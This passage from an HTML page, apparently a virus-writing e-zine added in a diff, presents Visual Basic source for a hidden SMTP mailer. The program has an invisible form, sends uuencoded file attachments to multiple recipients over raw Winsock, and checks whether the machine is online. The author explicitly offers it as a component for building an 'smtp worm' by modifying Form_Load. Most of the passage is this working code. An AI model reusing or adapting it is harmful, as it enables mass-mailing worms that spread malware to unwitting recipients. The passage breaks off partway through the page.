+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End Function</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Function GetSpecialfolder(CSIDL As Long) As String</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim r As Long</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim IDL As ITEMIDLIST</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim path As String</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>r = SHGetSpecialFolderLocation(100, CSIDL, IDL)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>If r = 0 Then</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>path$ = Space$(512)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>r = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal path$)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>GetSpecialfolder = Left$(path, InStr(path, Chr$(0)) - 1)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Exit Function</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End If</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>GetSpecialfolder = &quot;&quot;</B></FONT><BR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End Function</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>==========================================================</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>smtp command-line mailer, concocted by me, ready to be gnued by you</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>==========================================================</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>the uuencode routine ain't my work.. thankie to a programmer..</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>just modify the Sub Form_Load() and i'm sure you'll be able to make your smtp worm..</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>VERSION 5.00</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Object = &quot;{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0&quot;; &quot;MSWINSCK.OCX&quot;</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Begin VB.Form Form1 </B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;BorderStyle &nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;0 &nbsp;'None</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;Caption &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;&quot;Form1&quot;</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;ClientHeight &nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;90</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;ClientLeft &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;0</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;ClientTop &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;0</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;ClientWidth &nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;90</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;LinkTopic &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;&quot;Form1&quot;</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;ScaleHeight &nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;90</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;ScaleWidth &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;90</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;ShowInTaskbar &nbsp;&nbsp;= &nbsp;&nbsp;0 &nbsp;&nbsp;'False</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;StartUpPosition = &nbsp;&nbsp;3 &nbsp;'Windows Default</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;Begin MSWinsockLib.Winsock Winsock1 </B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Left &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;120</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Top &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;240</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_ExtentX &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;741</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_ExtentY &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;741</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_Version &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= &nbsp;&nbsp;393216</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;End</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Attribute VB_Name = &quot;Form1&quot;</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Attribute VB_GlobalNameSpace = False</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Attribute VB_Creatable = False</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Attribute VB_PredeclaredId = True</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Attribute VB_Exposed = False</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Option Explicit</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Response As String</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Declare Sub Sleep Lib &quot;kernel32&quot; (ByVal dwMilliseconds As Long)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Declare Function SHGetSpecialFolderLocation Lib &quot;shell32.dll&quot; (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Declare Function SHGetPathFromIDList Lib &quot;shell32.dll&quot; Alias &quot;SHGetPathFromIDListA&quot; (ByVal pidl As Long, ByVal pszPath As String) As Long</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Declare Function InternetGetConnectedState Lib &quot;wininet.dll&quot; (ByRef lpdwFlags As Long, ByVal dwReserved As Long) As Long</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Const CSIDL_TIF = &amp;H20</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Type SHITEMID</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>cb As Long</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>abID As Byte</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End Type</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Type ITEMIDLIST</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>mkid As SHITEMID</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End Type</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Sub Form_Load()</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>On Error Resume Next</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim comm As String, mailserv As String, sender As String, recip As String, subject As String, message As String, attachment As String</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim a</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>comm = InputBox(&quot;enter parameters ::: &nbsp;(mailserver/sender email address/&quot; &amp; vbCrLf &amp; _</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>&quot;recipients separated by ;/subject/message/attachment path) &quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>a = Split(comm, &quot;/&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>mailserv = a(0)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>sender = a(1)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>recip = a(2)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>subject = a(3)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>message = a(4)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>attachment = a(5)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>If InternetGetConnectedState(0&amp;, 0&amp;) = 0 Then</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>MsgBox &quot;your pc is not connected to the internet&quot;, vbCritical, &quot;smtp&quot;</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Unload Me</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Else</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>dddddd mailserv, sender, recip, subject, message, attachment</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Unload Me</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End If</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End Sub</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Function dddddd(mailsrv As String, send As String, recip As String, subj As String, mess As String, attch As String)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim collon As String, strserver As String, proxy As Long</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim arr1, mail</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>arr1 = Split(recip, &quot;;&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>For Each mail In arr1</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Winsock1.LocalPort = 0</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>If Winsock1.State = sckClosed Then</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Winsock1.Protocol = sckTCPProtocol</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>strserver = Trim(mailsrv)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>collon = InStr(strserver, &quot;:&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>If collon = 0 Then</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Winsock1.Connect strserver, 25</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Else</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>proxy = CLng(Right$(strserver, Len(strserver) - collon))</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>strserver = Left$(strserver, collon - 1)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Winsock1.Connect strserver, proxy</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End If</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>W4C (&quot;220&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Winsock1.SendData &quot;HELO &quot; &amp; dom(send) &amp; vbCrLf</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>W4C (&quot;250&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Winsock1.SendData &quot;MAIL FROM:&quot; &amp; &quot;&lt;&quot; &amp; send &amp; &quot;&gt;&quot; &amp; vbCrLf</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>W4C (&quot;250&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Winsock1.SendData &quot;RCPT TO: &quot; &amp; &quot;&lt;&quot; &amp; mail &amp; &quot;&gt;&quot; &amp; vbCrLf</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>W4C (&quot;250&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Winsock1.SendData &quot;DATA&quot; &amp; vbCrLf</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>W4C (&quot;354&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Winsock1.SendData &quot;From:&quot; &amp; send &amp; &quot; &lt;&quot; &amp; send &amp; &quot;&gt;&quot; &amp; vbCrLf</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Winsock1.SendData &quot;To:&quot; &amp; mail &amp; &quot; &lt;&quot; &amp; mail &amp; &quot;&gt;&quot; &amp; vbCrLf</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Winsock1.SendData &quot;Subject:&quot; &amp; subj &amp; vbCrLf &amp; vbCrLf</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Winsock1.SendData mess &amp; vbCrLf &amp; vbCrLf &amp; UUEncodeFile(attch) &amp; vbCrLf</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Winsock1.SendData vbCrLf &amp; &quot;.&quot; &amp; vbCrLf</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>W4C (&quot;250&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Winsock1.SendData &quot;QUIT&quot; &amp; vbCrLf</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>W4C (&quot;221&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Winsock1.Close</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>dddddd = True</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Else</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End If</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Next mail</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End Function</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Winsock1.GetData Response</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End Sub</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Sub W4C(ResponseCode As String)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim TT As Single</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim TTT As Single</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>TT = Timer</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>While Len(Response) = 0</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>TTT = TT - Timer</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>DoEvents</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>If TTT &gt; 24 Then</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Exit Sub</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End If</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Sleep 1</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Wend</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>While Left(Response, 3) &lt;&gt; ResponseCode</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>DoEvents</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>If TTT &gt; 50 Then</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Exit Sub</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End If</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Sleep 1</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Wend</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Response = &quot;&quot;</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End Sub</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Function dom(strPath As String) As String</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;dom = Mid(strPath, InStrRev(strPath, &quot;@&quot;) + 1)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End Function</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Public Function UUEncodeFile(strFilePath As String) As String</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim intFile &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;As Integer</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim intTempFile &nbsp;&nbsp;&nbsp;&nbsp;As Integer</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim lFileSize &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;As Long</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim strFileName &nbsp;&nbsp;&nbsp;&nbsp;As String</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim strFileData &nbsp;&nbsp;&nbsp;&nbsp;As String</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim lEncodedLines &nbsp;&nbsp;As Long</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim strTempLine &nbsp;&nbsp;&nbsp;&nbsp;As String</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim i &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;As Long</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim j &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;As Integer</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim strResult &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;As String</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>strFileName = Mid$(strFilePath, InStrRev(strFilePath, &quot;\&quot;) + 1)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>strResult = &quot;begin 664 &quot; + strFileName + vbCrLf</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>lFileSize = FileLen(strFilePath)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>lEncodedLines = lFileSize \ 45 + 1</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>strFileData = Space(45)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>intFile = FreeFile</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Open strFilePath For Binary As intFile</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>For i = 1 To lEncodedLines</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>If i = lEncodedLines Then</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>strFileData = Space(lFileSize Mod 45)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End If</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Get intFile, , strFileData</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>strTempLine = Chr(Len(strFileData) + 32)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>If i = lEncodedLines And (Len(strFileData) Mod 3) Then</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>strFileData = strFileData + Space(3 - (Len(strFileData) Mod 3))</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End If</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>For j = 1 To Len(strFileData) Step 3</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>strTempLine = strTempLine + Chr(Asc(Mid(strFileData, j, 1)) \ 4 + 32)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>strTempLine = strTempLine + Chr((Asc(Mid(strFileData, j, 1)) Mod 4) * 16 _</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ Asc(Mid(strFileData, j + 1, 1)) \ 16 + 32)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>strTempLine = strTempLine + Chr((Asc(Mid(strFileData, j + 1, 1)) Mod 16) * 4 _</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+ Asc(Mid(strFileData, j + 2, 1)) \ 64 + 32)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>strTempLine = strTempLine + Chr(Asc(Mid(strFileData, j + 2, 1)) Mod 64 + 32)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Next j</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>strTempLine = Replace(strTempLine, &quot; &quot;, &quot;`&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>strResult = strResult + strTempLine + vbCrLf</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>strTempLine = &quot;&quot;</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Next i</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Close intFile</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>strResult = strResult &amp; &quot;`&quot; &amp; vbCrLf + &quot;end&quot; + vbCrLf</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>UUEncodeFile = strResult</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End Function</B></FONT><BR>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>=======</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>postlude</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>=======</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
